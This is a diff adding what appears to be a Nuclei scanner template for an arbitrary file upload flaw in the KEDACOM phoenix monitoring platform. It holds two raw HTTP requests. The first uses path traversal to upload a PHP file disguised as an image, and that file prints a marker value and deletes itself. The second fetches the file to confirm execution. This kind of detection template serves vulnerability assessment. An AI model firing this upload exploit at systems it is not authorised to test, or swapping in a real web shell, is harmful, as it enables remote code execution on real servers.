@@ -1,0 +1,39 @@
+id: KEDACOM-phoenix-upload_fcgi-File-upload
+
+info:
+  name: KEDACOM phoenix监控平台 upload_fcgi 任意文件上传漏洞
+  author: xxx
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName={{username}}.php HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1v98KI1jc9w1bG97
+
+        ----WebKitFormBoundary1v98KI1jc9w1bG97
+        Content-Disposition: form-data; name="Filedata": filename="{{username}}"
+        Content-Type: image/jpeg
+
+        <?php print(1111*2222);unlink(__FILE__);?>
+        ----WebKitFormBoundary1v98KI1jc9w1bG97--
+  - raw:
+      - |
+        GET /{{username}}.php HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '2468642'
+      - type: status
+        status: 
+          - 200
